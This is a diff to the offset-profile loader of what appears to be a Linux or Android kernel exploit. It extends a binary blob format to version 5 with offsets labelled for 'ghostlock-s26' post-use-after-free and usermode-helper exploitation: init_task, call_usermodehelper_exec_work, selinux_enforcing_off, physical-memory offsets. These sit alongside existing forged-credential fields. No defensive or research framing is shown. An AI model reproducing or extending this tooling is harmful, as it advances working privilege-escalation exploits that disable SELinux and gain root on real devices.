@@ -50,7 +50,7 @@
 #include "kernel_table.h"
 
 #define BLOB_MAGIC "C982"
-#define BLOB_VERSION 4
+#define BLOB_VERSION 5
 /* v2 blobs are still accepted: they simply carry no task_alloc_link. */
 #define BLOB_VERSION_MIN 2
 /* Minimum accepted size (v2, no task_alloc_link). Used only for the length gate. */
@@ -58,7 +58,9 @@
 /* v3 adds task_alloc_link; v4 adds the forged-cred layout (B4). */
 #define BLOB_SIZE_V3 264
 #define BLOB_SIZE_V4 308
-#define BLOB_SIZE BLOB_SIZE_V4
+/* v5 adds ghostlock-s26 post-UAF/UMH offsets (13*u64 + 3*u64 + 2*u32 = 136 bytes). */
+#define BLOB_SIZE_V5 444
+#define BLOB_SIZE BLOB_SIZE_V5
 
 static struct kernel_offsets g_offsets;
 static int g_offsets_loaded = 0;
@@ -186,6 +188,28 @@ static int parse_blob(const uint8_t *blob, uint32_t length) {
         apply_cred_defaults(&g_offsets);
     }
 
+    /* v5: ghostlock-s26 post-UAF / UMH offsets (optional). */
+    if (version >= 5 && length >= BLOB_SIZE_V5) {
+        g_offsets.init_task                      = rd_u64(blob + 308);
+        g_offsets.root_task_group                = rd_u64(blob + 316);
+        g_offsets.misc_list                      = rd_u64(blob + 324);
+        g_offsets.uinput_misc                    = rd_u64(blob + 332);
+        g_offsets.simple_attr_read               = rd_u64(blob + 340);
+        g_offsets.simple_attr_write              = rd_u64(blob + 348);
+        g_offsets.debugfs_u64_get                = rd_u64(blob + 356);
+        g_offsets.debugfs_u64_set                = rd_u64(blob + 364);
+        g_offsets.debugfs_u64_format             = rd_u64(blob + 372);
+        g_offsets.default_llseek                 = rd_u64(blob + 380);
+        g_offsets.call_usermodehelper_exec_work  = rd_u64(blob + 388);
+        g_offsets.system_unbound_wq              = rd_u64(blob + 396);
+        g_offsets.selinux_enforcing_off          = rd_u64(blob + 404);
+        g_offsets.tracefs_worker_caller_off      = rd_u64(blob + 412);
+        g_offsets.phys_offset                    = rd_u64(blob + 420);
+        g_offsets.phys_load                      = rd_u64(blob + 428);
+        g_offsets.tracefs_event_id               = rd_u32(blob + 436);
+        g_offsets.gl_reserved                    = rd_u32(blob + 440);
+    }
+
     /* integrity check: critical fields must not be 0 */
     if (!g_offsets.timer_link || !g_offsets.cred_link || !g_offsets.selinux_link) {
         fprintf(stderr, "[config] error: profile critical offsets missing\n");
@@ -260,6 +284,13 @@ void kernel_table_dump(void) {
            o->cred_size, o->cred_cap_inh, o->cred_cap_perm, o->cred_cap_eff,
            o->cred_cap_bset, o->cred_cap_amb, o->cred_off_security,
            o->cred_off_user, o->cred_off_user_ns, o->cred_off_ucounts, o->cred_off_groups);
+    if (o->call_usermodehelper_exec_work || o->misc_list) {
+        printf("[config] umh: init_task=0x%llx misc_list=0x%llx umh_exec=0x%llx wq=0x%llx selinux=0x%llx\n",
+               (unsigned long long)o->init_task, (unsigned long long)o->misc_list,
+               (unsigned long long)o->call_usermodehelper_exec_work,
+               (unsigned long long)o->system_unbound_wq,
+               (unsigned long long)o->selinux_enforcing_off);
+    }
 }
 
 /*
